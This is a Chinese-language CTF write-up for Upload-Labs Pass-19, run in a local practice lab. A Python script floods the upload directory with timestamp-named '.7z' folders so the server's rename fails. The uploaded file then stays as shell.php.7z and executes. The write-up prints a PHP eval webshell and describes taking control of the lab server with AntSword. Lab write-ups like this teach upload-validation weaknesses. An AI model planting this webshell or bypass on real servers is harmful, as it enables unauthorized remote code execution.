【Upload-Labs】Pass-19 MyUpload 改名竞争与目录占位法 Writeup

操作者：何芊宏 | 操作日期：2026.11.03 | 分类：CTF | 标签：Upload-Labs, Web, 文件上传, 目录占位, WebShell

1. 题目信息

  • 平台：Upload-Labs (本地 phpStudy 环境)
  • 分类：Web - 文件上传
  • 题目名称：Pass-19 (MyUpload 改名竞争)
  • 提示：上传文件后，服务端尝试将其重命名为“时间戳.7z”。

2. 核心原理与前置分析

目录占位法：源码逻辑为先将文件移动（move_uploaded_file）到目标目录，随后尝试将其重命名（rename）为当前的时间戳后缀。在 Windows 操作系统下，rename 函数无法将文件覆盖到一个**已存在的同名文件夹**上。通过提前创建大量当前时间戳范围内的 .7z 文件夹，可以让服务端的重命名操作强制失败。原文件 shell.php.7z 被保留，从而利用 Apache 对文件名中 .php 的解析机制触发执行。

时区差异踩坑：初始使用 PowerShell 生成时间戳，由于 PowerShell 获取的 Unix 时间戳与 PHP 存在时区偏差，导致文件夹时间对不上。后改用 Python 的 time.time()，确保与 PHP 时间戳完全一致，才成功卡住改名逻辑。

3. 工具配置与操作步骤

工具配置：VS Code、Python 与 中国蚁剑

  • 中国蚁剑：URL 地址指向保留的 shell.php.7z；连接密码：cmd。

操作步骤与解析：

第一步：Python 脚本生成占位目录

编写 Python 脚本，在靶场 upload 目录下生成当前时间前后 300 秒的文件夹，精确布下陷阱：

import os
import time

base = r'D:\phpstudy_pro\WWW\upload-labs\upload'
t = int(time.time())

for i in range(t - 300, t + 300):
    folder = os.path.join(base, f"{i}.7z")
    if not os.path.exists(folder):
        os.makedirs(folder)

在 VS Code 中运行该脚本，瞬间生成几百个 .7z 文件夹。

第二步：上传 Payload 并触发保护

准备文件 shell.php.7z（内容为 <?php @eval($_POST['cmd']); ?>），在 Pass-19 页面上传。

服务端尝试将其重命名为当前时间戳，由于目标名字已被我们的文件夹占用，重命名失败。页面提示：“文件已经被上传，但没有重命名。”

第三步：验证与连接

在浏览器访问 http://127.0.0.1:8081/upload/shell.php.7z，页面纯白。使用蚁剑连接该地址，密码 cmd，成功获取服务器权限。随后清理 shell.php.7z 及所有生成的占位文件夹。

4. 踩坑记录与复盘

  • 时区背刺：使用 PowerShell (Get-Date -UFormat %s) 生成的时间戳与 PHP 环境存在差异。必须使用 Python 的 time.time() 以确保时间戳同源对齐。
  • 伪命名的绕过机制：利用系统底层文件系统特性（文件不可覆盖同名目录），破坏服务端的重命名流程，使文件停留在了可执行的中间状态。

5. 知识点总结

  • 目录占位法：针对改名为随机时间戳的逻辑，利用提前建立同名目录的方式，阻止服务端重命名文件。
  • 多后缀解析机制：利用 vhost 配置中 FcgidWrapper 对 .php 的识别，使形如 shell.php.7z 的文件依然能够执行 PHP 代码。
